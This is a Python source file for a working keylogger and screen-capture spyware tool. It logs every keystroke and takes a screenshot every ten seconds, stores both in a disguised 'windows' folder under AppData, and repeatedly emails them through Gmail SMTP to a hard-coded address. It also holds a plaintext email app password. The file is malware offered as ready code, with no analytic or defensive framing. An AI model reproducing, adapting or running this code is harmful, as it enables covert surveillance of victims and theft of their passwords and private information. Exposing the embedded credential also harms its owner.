import os
import time
import smtplib
from threading import Thread
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket

# Directories for saving key logs and screenshots
keylogger_folder = os.path.join(os.environ['appdata'], "windows")
keys_information = os.path.join(keylogger_folder, "key_log.txt")
screenshot_folder = os.path.join(keylogger_folder, "hps")
unsent_folder = os.path.join(keylogger_folder, "unsent_emails")

# Email Configuration
email_address = "test123.moali@gmail.com"  
email_password = "bevnfpjwkmodnuln"  
recipient_email = "test123.moali@gmail.com"  

# Ensure the folders exist
os.makedirs(keylogger_folder, exist_ok=True)
os.makedirs(screenshot_folder, exist_ok=True)
os.makedirs(unsent_folder, exist_ok=True)

# Keylogger function
def keylogger():
    typed_text = ""  # To keep track of the current typed sentence/word

    def on_press(key):
        nonlocal typed_text
        try:
            k = str(key).replace("'", "")
            if k == "Key.space":
                typed_text += " "  # Add space to the text
            elif k == "Key.enter":
                typed_text += "\n"  # New line for enter
            elif k == "Key.backspace" or k == "Key.delete":
                if typed_text:  # Remove last character for backspace/delete
                    typed_text = typed_text[:-1]
            elif "Key" not in k:
                typed_text += k  # Add the typed character

            write_file(typed_text)

        except Exception:
            pass

    def write_file(typed_text):
        with open(keys_information, "w") as f:
            f.write(typed_text)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Screenshot capture function
def periodic_screenshot_capture():
    def capture_screenshot():
        img = ImageGrab.grab()
        timestamp = str(int(time.time()))
        img_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
        img.save(img_path, "PNG")
        print(f"Screenshot saved as {img_path}")

    while True:
        capture_screenshot()
        time.sleep(10)

# Check internet connectivity
def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except socket.error:
        return False

# Email sending function
def send_email():
    while True:
        if is_connected():
            try:
                msg = MIMEMultipart()
                msg['From'] = email_address
                msg['To'] = recipient_email
                msg['Subject'] = "Key Logs and Screenshots"
                body = "Attached are the latest key logs and screenshots."
                msg.attach(MIMEText(body, 'plain'))

                # Attach key logs
                if os.path.exists(keys_information):
                    with open(keys_information, "rb") as file:
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(file.read())
                        encoders.encode_base64(attachment)
                        attachment.add_header('Content-Disposition', f"attachment; filename={os.path.basename(keys_information)}")
                        msg.attach(attachment)

                # Collect and attach all screenshots from both folders
                all_screenshots = []
                for folder in [screenshot_folder, unsent_folder]:
                    for file_name in os.listdir(folder):
                        file_path = os.path.join(folder, file_name)
                        if file_name.endswith(".png"):
                            all_screenshots.append(file_path)
                            with open(file_path, "rb") as file:
                                attachment = MIMEBase('application', 'octet-stream')
                                attachment.set_payload(file.read())
                                encoders.encode_base64(attachment)
                                attachment.add_header('Content-Disposition', f"attachment; filename={file_name}")
                                msg.attach(attachment)

                # Send the email
                with smtplib.SMTP('smtp.gmail.com', 587) as server:
                    server.starttls()
                    server.login(email_address, email_password)
                    server.sendmail(email_address, recipient_email, msg.as_string())
                    print("Email sent successfully.")

                # Clear sent screenshots
                for file_path in all_screenshots:
                    os.remove(file_path)

            except Exception as e:
                print(f"Error sending email: {e}")

        else:
            print("No internet connection. Retrying later...")
            save_unsent_files()

        time.sleep(20)  # Retry every 10 minutes

# Save unsent files for retry
def save_unsent_files():
    for file_name in os.listdir(screenshot_folder):
        file_path = os.path.join(screenshot_folder, file_name)
        if file_name.endswith(".png"):
            new_path = os.path.join(unsent_folder, file_name)
            if not os.path.exists(new_path):  # Avoid overwriting existing files
                os.rename(file_path, new_path)

# Main function
def main():
    keylogger_thread = Thread(target=keylogger)
    screenshot_thread = Thread(target=periodic_screenshot_capture)
    email_thread = Thread(target=send_email)

    keylogger_thread.start()
    screenshot_thread.start()
    email_thread.start()

    keylogger_thread.join()
    screenshot_thread.join()
    email_thread.join()

if __name__ == "__main__":
    main()
